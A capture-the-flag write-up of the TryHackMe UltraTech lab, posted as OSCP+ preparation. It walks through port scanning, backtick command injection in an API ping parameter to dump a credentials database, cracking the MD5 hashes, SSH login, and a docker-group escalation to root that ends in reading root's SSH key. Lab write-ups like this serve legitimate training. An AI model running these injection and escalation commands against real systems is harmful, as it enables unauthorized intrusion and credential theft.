---
layout: post
title:  THM UltraTech Write-up
description: Part of the OSCP+ Preparation Series
date:   2024-11-12 11:00:00 +0300
image:  '/images/thm_ultratech.png'
tags:   [Write-ups, THM, OSCP+, Medium, API, Arbitrary-File-Read, SSH, GTFOBins-Shell, Docker]
---

# Table of Contents
- [Enumeration](#enumeration)
  - [Nmap](#nmap)
  - [Web Enumeration](#web-enumeration)
- [Foothold](#foothold)
  - [Interacting with the API URL to enumerate files and find hashes on database .db file](#interacting-with-the-api-url-to-enumerate-files-and-find-hashes-on-database-db-files)
  - [Cracking the hashes](#cracking-the-hashes)
  - [Getting SSH access as r00t](#getting-ssh-access-as-r00t)
- [Privilege Escalation](#privilege-escalation)
  - [Using id to find out that r00t is part of docker group](#using-id-to-find-out-that-r00t-is-part-of-docker-group)
  - [Using shell GTFOBins command to escalate privileges](#using-shell-gtfobins-command-to-escalate-privileges)
  - [Reading id_rsa of root](#reading-id_rsa-of-root)

# Enumeration

### Nmap

```shell
# Step 1 - Find active ports
nmap -p- --min-rate 10000 10.10.211.145

# Step 2 - Focus scan on the active ports found
nmap -A -T4 -Pn -p21,22,8081,31331,37445 10.10.211.145
```

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-12 03:31 EST
Nmap scan report for 10.10.211.145
Host is up (0.052s latency).

PORT      STATE  SERVICE VERSION
21/tcp    open   ftp     vsftpd 3.0.3
22/tcp    open   ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)
|   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)
|_  256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (ED25519)
8081/tcp  open   http    Node.js Express framework
|_http-cors: HEAD GET POST PUT DELETE PATCH
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
31331/tcp open   http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
37445/tcp closed unknown
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.26 seconds
```

Looking at the results of our nmap scan we can see FTP, SSH and two HTTP. Lets enumerate the HTTP ports first.

### Web Enumeration
If we visit port 8081, we will see UltraTech API v0.1.3, meaning that port 8081 is leading to an API:

```shell
http://10.10.211.145:8081/
```

If we visit port 31331, we will see a website of what seems to be a company.

We can also find a robots.txt file leading us to the file /utech_sitemap.txt:

```shell
http://10.10.211.145:31331/robots.txt
```

If we visit /utech_sitemap.txt, we will find more interesting files to visit:

```shell
/
/index.html
/what.html
/partners.html
```

We checked them, but the only interesting one seems to be /partners.html, leading us to a login portal.

If we inspect the source code of /partners.html, we will see this at the bottom:

```shell
<SNIP>
				</form>
				</div>
			</div>
		</div>
	</div>
	<script src='js/app.min.js'></script>
	<script src='js/api.js'></script>
</body>
</html>
```

If we click on js/api.js, it will lead us to another page, where we can see a line interacting with the API URL:

```shell
<SNIP>
    function checkAPIStatus() {
	const req = new XMLHttpRequest();
	try {
	    const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
	    req.open('GET', url, true);
	    req.onload = function (e) {
<SNIP>
```

Here it is:

```shell
const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
```

# Foothold
### Interacting with the API URL to enumerate files and find hashes on database .db file
It seems like the const url is using ping on an IP, lets try to ping 127.0.0.1, since we know this IP theoretically always exists, and see if we get any answer. We can do that entering the following URL in our web browser:

```shell
http://10.10.211.145:8081/ping?ip=127.0.0.1
```

```shell
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data. 64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.015 ms --- 127.0.0.1 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 0.015/0.015/0.015/0.000 ms
```

It worked! We got a response showing the results of running the ping command.

Now we can try to run other commands like whoami:

```shell
http://10.10.211.145:8081/ping?ip=whoami
```

It didnt work. Lets try to put whoami like 'whoami':

```shell
http://10.10.211.145:8081/ping?ip='whoami'
```

It also didnt work. Lets try something else. Maybe like \`whoami\`?

```shell
10.10.211.145:8081/ping?ip=`whoami`
```

```shell
ping: www: Temporary failure in name resolution
```

It worked! We got www as ping response, which is actually the result of running the whoami command.

Lets enumerate the files on the directory:

```shell
http://10.10.211.145:8081/ping?ip=`ls%20-al`
```

```shell
ping: utech.db.sqlite: Name or service not known 
```

It seems like there is only utech.db.sqlite. Lets check its content:

```shell
http://10.10.211.145:8081/ping?ip=`cat%20utech.db.sqlite`
```

```shell
ping: ) ���(Mr00tf357a0c52799563c7c7b76c1e7543a32)Madmin0d0ea5111e3c1def594c1684e3b9be84: Parameter string not correctly encoded
```

Nice! We got some hashes:

```shell
Mr00t:f357a0c52799563c7c7b76c1e7543a32
Madmin:0d0ea5111e3c1def594c1684e3b9be84
```

We can suppose that the first user is called "r00t" and the second one "admin".

### Cracking the hashes

Lets try to crack these hashes:

```shell
hashid 'f357a0c52799563c7c7b76c1e7543a32'
```

We got many results of possible valid hash types. Lets suppose its just a normal MD5, which uses -m 0 on hashcat. Now we can try to crack it:

```shell
hashcat -m 0 MrRoot_hash.txt /usr/share/wordlists/rockyou.txt
```

We were able to successfully crack both of them and retrieve the following passwords:

```shell
r00t:n100906
admin:mrsheafy
```

### Getting SSH access as r00t

Lets try to get access using SSH now using r00t as username and the password we just cracked:

```shell
ssh r00t@10.10.211.145
```

Nice! We got access as r00t.

# Privilege Escalation
### Using id to find out that r00t is part of docker group
Using the command id we were able to find out that r00t is part of the docker group:

```shell
id

uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
```

This may allow us to run docker with privileged permission.

### Using shell GTFOBins command to escalate privileges
Searching for docker on GTFOBins we found the following command:

```shell
docker run -v /:/mnt --rm -it bash chroot /mnt sh
```

```shell
r00t@ultratech-prod:~$ docker run -v /:/mnt --rm -it bash chroot /mnt sh
# whoami
root
```

It worked! We got a shell as root.

### Reading id_rsa of root
Now we can read the contents of the root id_rsa and answer the last question:

```shell
cat /root/.ssh/id_rsa
```